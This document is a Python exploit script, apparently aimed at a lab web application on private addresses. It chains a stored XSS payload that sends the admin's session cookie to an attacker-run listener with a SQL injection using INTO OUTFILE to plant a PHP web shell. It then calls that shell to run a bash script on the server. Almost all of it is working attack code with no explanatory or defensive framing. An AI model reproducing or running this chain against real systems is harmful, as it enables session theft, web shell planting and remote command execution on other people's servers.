import requests
import re
import socket

##Env Prameter
host="192.168.222.5"
port=80
targetCookie=""

##Exploit From Burp
target = "http://192.168.222.4:80/post_comment.php?id=1"
burp0_headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Content-Type": "application/x-www-form-urlencoded", "Origin": "http://192.168.222.4", "Connection": "close", "Referer": "http://192.168.222.4/post.php?id=1", "Upgrade-Insecure-Requests": "1"}
burp0_data = {"title": "useless", "author": "useless", "text": "        <img src=\"1\" onerror=\"document.location='http://"+host+"/'+document.cookie\" />", "submit": "Submit Query"}
requests.post(target, headers=burp0_headers,  data=burp0_data)



### Start Server receive the Cookie
with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.bind((host, port))
    s.listen(1)
    conn, addr = s.accept()
    with conn:
        found = True
        while found:
            found = False
            m=conn.recv(2048)
            print(m.decode('utf-8'))
            out=re.findall("PHPSESSID\=.*HTTP",m.decode('utf-8'))
                        
            if ( len(out)>0 ):
                print("[+] Find cookie")
                out=out[0].replace("PHPSESSID=","").replace("HTTP","")
                targetCookie=out.replace("\n","").replace("\t","")
                found = True



print("Target Cookie is: "+targetCookie)

## From Burp
burp0_url = "http://192.168.222.4:80/admin/edit.php?id=-1%20union%20select%20%22%3C%5C%3Fphp%22%2C%22if%28isset%28%24_GET%5B%27cmd%27%5D%29%29%20%7B%20system%28%24_GET%5B%27cmd%27%5D%29%3B%20%7D%22%2C%22%20%22%2C%22%5C%3F%3E%22%20INTO%20OUTFILE%20%27%2Fvar%2Fwww%2Fadmin%2Fuploads%2Fg.php%27"
burp0_cookies = {"PHPSESSID": targetCookie }
burp0_headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Referer": "http://192.168.222.4/admin/", "Connection": "close", "Upgrade-Insecure-Requests": "1", "Cache-Control": "max-age=0"}
requests.get(burp0_url, headers=burp0_headers, cookies=burp0_cookies)


## From Burp
burp0_url = "http://192.168.222.4:80/admin/uploads/g.php?cmd=/bin/bash%20/tmp/s.sh"
burp0_cookies = {"PHPSESSID": targetCookie }
burp0_headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Connection": "close", "Upgrade-Insecure-Requests": "1"}
requests.get(burp0_url, headers=burp0_headers, cookies=burp0_cookies)